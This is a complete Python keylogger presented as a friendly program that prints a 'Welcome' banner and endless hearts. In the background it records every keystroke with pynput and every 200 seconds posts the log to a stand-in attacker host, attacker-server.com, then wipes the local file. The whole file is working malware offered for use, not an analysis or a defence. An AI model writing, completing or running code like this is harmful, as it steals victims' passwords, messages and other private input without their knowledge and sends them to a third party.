import os
import time
import requests
from pynput.keyboard import Listener
from threading import Thread

# File to store keystrokes
LOG_FILE = "keystrokes.log"
ATTACKER_SERVER_URL = "http://attacker-server.com/log"  # Attacker server's URL

# ASCII Art to display on program start
ASCII_ART = """
  __      __       .__                               
 /  \    /  \ ____ |  |   ____ ___.__. ____  __ __   
 \   \/\/   // __ \|  |  /  _ <   |  |/ __ \|  |  \  
  \        /\  ___/|  |_(  <_> )___  \  ___/|  |  /  
   \__/\  /  \___  >____/\____// ____|\___  >____/   
        \/       \/            \/         \/         
"""

# Function to handle key press event
def on_press(key):
    try:
        with open(LOG_FILE, "a") as file:
            file.write(f"{key.char}")
    except AttributeError:
        with open(LOG_FILE, "a") as file:
            file.write(f"<{key}>")

# Function to periodically send the log file to the attacker server
def send_logs_periodically():
    while True:
        time.sleep(200)  # Wait for 200 seconds
        if os.path.exists(LOG_FILE) and os.path.getsize(LOG_FILE) > 0:
            try:
                with open(LOG_FILE, "r") as file:
                    logs = file.read()
                response = requests.post(ATTACKER_SERVER_URL, data={"logs": logs})

                if response.status_code == 200:
                    print("Logs sent successfully.")
                    open(LOG_FILE, "w").close()  # Clear the log file after successful transmission
                else:
                    print(f"Failed to send logs. Server responded with status: {response.status_code}")

            except Exception as e:
                print(f"Error while sending logs: {e}")

# Function to print hearts periodically
def print_hearts():
    while True:
        print("<3\n")
        time.sleep(1)

# Function to start listening to the keyboard
def start_keylogger():
    with Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    print(ASCII_ART)

    # Run the keylogger in the background
    keylogger_thread = Thread(target=start_keylogger, daemon=True)
    keylogger_thread.start()

    # Run the log sender in the background
    log_sender_thread = Thread(target=send_logs_periodically, daemon=True)
    log_sender_thread.start()

    # Run the heart printer in the background
    heart_printer_thread = Thread(target=print_hearts, daemon=True)
    heart_printer_thread.start()

    # Keep the main thread alive
    while True:
        time.sleep(1)
